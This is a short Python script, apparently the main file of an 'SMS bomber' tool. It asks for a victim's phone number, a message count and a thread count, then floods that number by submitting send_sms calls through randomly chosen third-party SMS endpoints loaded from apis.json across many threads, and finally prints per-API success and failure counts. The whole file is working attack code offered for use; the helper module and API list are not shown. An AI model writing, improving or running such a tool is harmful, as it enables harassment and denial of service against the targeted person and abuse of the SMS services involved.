# bomber.py

import requests
import json
import random
import time
from concurrent.futures import ThreadPoolExecutor
from utils import send_sms, delivery_log

# Load APIs
with open("apis.json", "r") as f:
    apis = json.load(f)

# Get user input
phone = input("Enter phone number with country code (e.g., +91XXXXXXXXXX): ").strip()
count = int(input("How many total messages to send?: "))
threads = int(input("How many threads to use?: "))

print("\\n[*] Starting SMS bombing...\\n")

start_time = time.time()
executor = ThreadPoolExecutor(max_workers=threads)

# Schedule messages
for _ in range(count):
    api = random.choice(apis)
    executor.submit(send_sms, api, phone)

executor.shutdown(wait=True)

# Print stats
end_time = time.time()
print("\\n[✔] Bombing complete in {:.2f} seconds.".format(end_time - start_time))
print("\\n===== DELIVERY CHART =====")
for api, stats in delivery_log.items():
    print(f"{api[:50]}... | ✅ {stats['success']} | ❌ {stats['fail']} | 🔁 {stats['retries']}")
